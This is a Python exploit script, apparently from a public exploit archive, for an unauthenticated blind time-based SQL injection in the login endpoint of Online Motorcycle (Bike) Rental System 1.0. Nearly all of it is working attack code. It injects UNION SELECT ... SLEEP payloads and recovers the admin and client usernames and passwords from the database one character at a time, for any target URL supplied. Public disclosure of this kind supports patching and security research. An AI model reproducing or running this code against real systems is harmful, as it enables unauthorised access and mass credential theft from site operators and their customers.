# Exploit Title: Online Motorcycle (Bike) Rental System 1.0 - Blind Time-Based SQL Injection (Unauthenticated)
# Exploit Author: Chase Comardelle(CASO)
# Date: October 18, 2021
# Vendor Homepage: https://www.sourcecodester.com/php/14989/online-motorcycle-bike-rental-system-phpoop-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/bike_rental_0.zip
# Tested on: Kali Linux, Apache, Mysql
# Vendor: oretnom23
# Version: v1.0
# Exploit Description:
# Online Motorcycle (Bike) Rental System is vulnerable to a Blind Time-Based SQL Injection attack. This can lead attackers to remotely dump MySql database credentials


#EXAMPLE PAYLOAD - test@email.com' UNION SELECT IF((SELECT SUBSTRING((SELECT password from users where username='admin'),1,1)='1'),sleep(10),'a'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;
#EXAMPLE EXECUTION - python3 sqliExploit.py http://localhost/bike_rental/ 

import requests
import sys
import urllib3
import pyfiglet 




urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}



def find_clients_usernames(url):
    clients = ""
    cookies = {'Cookie:':'PHPSESSID='}
    headers = {'DNT': '1', 'SEC-GPC': '1', 'Referer' : 'http://localhost/Retail_Digital_Banking/','Origin': 'http://localhost','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
    path = '/classes/Login.php?f=login_user'
    position = 1
    i=0
    while i <len(chars) :
        sqli = "email=test@email.com'UNION+SELECT+IF((SELECT+SUBSTRING((SELECT+GROUP_CONCAT(email+SEPARATOR+',')+from+clients),%s,1)='%s'),sleep(1),''),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-&password=test" %(position,chars[i])
        r = requests.post(url + path,data=sqli,headers=headers,cookies=cookies, verify=False)
    
        if r.elapsed.total_seconds() > 1:
            clients += chars[i]
            i=0
            position+=1
        else:
            i +=1    
    return clients


def find_db_usernames(url):
    users = ""
    cookies = {'Cookie:':'PHPSESSID='}
    headers = {'DNT': '1', 'SEC-GPC': '1', 'Referer' : 'http://localhost/Retail_Digital_Banking/','Origin': 'http://localhost','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
    path = '/classes/Login.php?f=login_user'
    position = 1
    i=0
    while i <len(chars) :
        sqli = "email=test@email.com'UNION+SELECT+IF((SELECT+SUBSTRING((SELECT+GROUP_CONCAT(username+SEPARATOR+',')+from+users),%s,1)='%s'),sleep(1),''),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-&password=test" %(position,chars[i])
        r = requests.post(url + path,data=sqli,headers=headers,cookies=cookies, verify=False)
    
        if r.elapsed.total_seconds() > 1:
            users += chars[i]
            i=0
            position+=1
        else:
            i +=1    
    return users

def find_db_passwords(url):
    passwords = ""
    clientCount = 0
    cookies = {'Cookie:':'PHPSESSID='}
    headers = {'DNT': '1', 'SEC-GPC': '1', 'Referer' : 'http://localhost/Retail_Digital_Banking/','Origin': 'http://localhost','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
    path = '/classes/Login.php?f=login_user'
    position = 1
    i=0

    while i <len(chars) :
        sqli = "email=test@email.com'UNION+SELECT+IF((SELECT+SUBSTRING((SELECT+GROUP_CONCAT(password+SEPARATOR+',')+from+users),%s,1)='%s'),sleep(1),''),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-&password=test" %(position,chars[i])
        r = requests.post(url + path,data=sqli,headers=headers,cookies=cookies, verify=False)

        if r.elapsed.total_seconds() > 1:
            passwords += chars[i]
            i=0
            position+=1
        else:
            i +=1   

    return passwords

def find_client_passwords(url):
    passwords = ""
    clientCount = 0
    cookies = {'Cookie:':'PHPSESSID='}
    headers = {'DNT': '1', 'SEC-GPC': '1', 'Referer' : 'http://localhost/Retail_Digital_Banking/','Origin': 'http://localhost','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
    path = '/classes/Login.php?f=login_user'
    position = 1
    i=0

    while i <len(chars) :
        sqli = "email=test@email.com'UNION+SELECT+IF((SELECT+SUBSTRING((SELECT+GROUP_CONCAT(password+SEPARATOR+',')+from+clients),%s,1)='%s'),sleep(1),''),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-&password=test" %(position,chars[i])
        r = requests.post(url + path,data=sqli,headers=headers,cookies=cookies, verify=False)

        if r.elapsed.total_seconds() > 1:
            passwords += chars[i]
            i=0
            position+=1
        else:
            i +=1   
 
    return passwords


def create_table(users,passwords):
    
    
    for  i in range(0,len(users)):
       print(users[i]," | ",passwords[i])

def print_header():
    
    print("\n")
    print(pyfiglet.figlet_format("      IDRBT", font = "slant"  ))  

chars = [ 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o',
          'p','q','r','s','t','u','v','w','x','y','z','A','B','C','D',
          'E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S',
          'T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7',
          '8','9','@','#',",",'.']



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)


print_header()
print("[*] RETRIEVING CREDENTIALS NOW [*]")
dbUsernames = find_db_usernames(url)
dbUsernames = dbUsernames.split(",")

dbPasswords = find_db_passwords(url)
dbPasswords = dbPasswords.split(",")

print("[*] DATABASE CREDENTIALS [*]")
create_table(dbUsernames,dbPasswords)

clientUsernames = find_clients_usernames(url)
clientsUsernames = clientUsernames.split(",")

clientPasswords = find_client_passwords(url)
clientPasswords = clientPasswords.split(",")

print("[*] CLIENT CREDENTIALS [*]")
create_table(clientsUsernames,clientPasswords)